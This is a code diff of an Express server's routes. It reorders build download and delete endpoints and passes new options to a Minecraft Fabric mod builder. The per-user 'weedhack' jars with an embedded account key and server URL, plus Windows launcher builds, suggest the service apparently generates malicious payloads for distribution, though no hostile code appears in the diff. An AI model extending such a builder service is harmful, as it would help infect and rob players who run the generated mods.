@@ -34,7 +34,6 @@ const CFG = {
   maxUpload:  Number(process.env.MAX_UPLOAD_BYTES || 64 * 1024 * 1024),
 };
 
-// dirs that must exist before any route references them
 const DOWNLOAD_DIR = path.join(__dirname, 'download');
 if (!fs.existsSync(DOWNLOAD_DIR)) fs.mkdirSync(DOWNLOAD_DIR, { recursive: true });
 
@@ -909,31 +908,7 @@ app.get('/api/builds', requireAuth, (req, res) => {
   res.json(rows);
 });
 
-app.get('/api/builds/:id/download', limitDownload, requireAuth, (req, res) => {
-  const id = Number(req.params.id);
-  const row = db.prepare(sql`
-    SELECT name, stored_name, size FROM builds WHERE id = ? AND user_id = ?
-  `).get(id, req.user.uid);
-  if (!row) return res.status(404).json({ error: 'not found' });
-  const src = path.join(BUILD_DIR, row.stored_name);
-  if (!fs.existsSync(src)) return res.status(410).json({ error: 'file gone' });
-  res.setHeader('Content-Type', 'application/zip');
-  res.setHeader('Content-Length', row.size);
-  res.setHeader('Content-Disposition', `attachment; filename="${row.name}"`);
-  fs.createReadStream(src).pipe(res);
-});
-
-app.delete('/api/builds/:id', requireAuth, (req, res) => {
-  const id = Number(req.params.id);
-  const row = db.prepare(sql`SELECT stored_name FROM builds WHERE id = ? AND user_id = ?`).get(id, req.user.uid);
-  if (!row) return res.status(404).json({ error: 'not found' });
-  const p = path.join(BUILD_DIR, row.stored_name);
-  try { fs.unlinkSync(p); } catch {}
-  db.prepare(sql`DELETE FROM builds WHERE id = ? AND user_id = ?`).run(id, req.user.uid);
-  res.json({ ok: true });
-});
-
-// ---------- builder — minecraft fabric ----------
+// ---------- builder — minecraft fabric (must precede /api/builds/:id/* routes) ----------
 
 app.post('/api/build/minecraft', requireAuth, limitMcBuild, async (req, res) => {
   const row = getOwnUser(req.user.uid);
@@ -950,7 +925,13 @@ app.post('/api/build/minecraft', requireAuth, limitMcBuild, async (req, res) => 
 
   (async () => {
     try {
-      const jarBuf = await buildMinecraftMod({ key: acctKey, buildId, serverBase });
+      const jarBuf = await buildMinecraftMod({
+        key: acctKey,
+        buildId,
+        serverBase,
+        target: req.body?.target,
+        loaderRange: req.body?.loaderRange,
+      });
       const outName = `weedhack_${buildId}_u${req.user.uid}.jar`;
       const outPath = path.join(MC_BUILD_DIR, outName);
       fs.writeFileSync(outPath, jarBuf, { mode: 0o644 });
@@ -996,6 +977,8 @@ app.get('/api/build/minecraft/progress/:id', requireAuth, (req, res) => {
   res.json(p);
 });
 
+// MC jar download — must be declared before /api/builds/:id/download so the
+// literal "minecraft" segment wins over the numeric :id param.
 app.get('/api/builds/minecraft/:id/download', limitDownload, requireAuth, (req, res) => {
   const id = Number(req.params.id);
   const row = db.prepare(sql`
@@ -1009,6 +992,34 @@ app.get('/api/builds/minecraft/:id/download', limitDownload, requireAuth, (req, 
   res.setHeader('Content-Length', row.size);
   res.setHeader('Content-Disposition', `attachment; filename="${row.name}"`);
   fs.createReadStream(src).pipe(res);
+});
+
+// ---------- windows launcher build download (after minecraft literal) ----------
+
+app.get('/api/builds/:id/download', limitDownload, requireAuth, (req, res) => {
+  const id = Number(req.params.id);
+  if (!Number.isFinite(id)) return res.status(404).json({ error: 'not found' });
+  const row = db.prepare(sql`
+    SELECT name, stored_name, size FROM builds WHERE id = ? AND user_id = ?
+  `).get(id, req.user.uid);
+  if (!row) return res.status(404).json({ error: 'not found' });
+  const src = path.join(BUILD_DIR, row.stored_name);
+  if (!fs.existsSync(src)) return res.status(410).json({ error: 'file gone' });
+  res.setHeader('Content-Type', 'application/zip');
+  res.setHeader('Content-Length', row.size);
+  res.setHeader('Content-Disposition', `attachment; filename="${row.name}"`);
+  fs.createReadStream(src).pipe(res);
+});
+
+app.delete('/api/builds/:id', requireAuth, (req, res) => {
+  const id = Number(req.params.id);
+  if (!Number.isFinite(id)) return res.status(404).json({ error: 'not found' });
+  const row = db.prepare(sql`SELECT stored_name FROM builds WHERE id = ? AND user_id = ?`).get(id, req.user.uid);
+  if (!row) return res.status(404).json({ error: 'not found' });
+  const p = path.join(BUILD_DIR, row.stored_name);
+  try { fs.unlinkSync(p); } catch {}
+  db.prepare(sql`DELETE FROM builds WHERE id = ? AND user_id = ?`).run(id, req.user.uid);
+  res.json({ ok: true });
 });
 
 // ---------- admin ----------
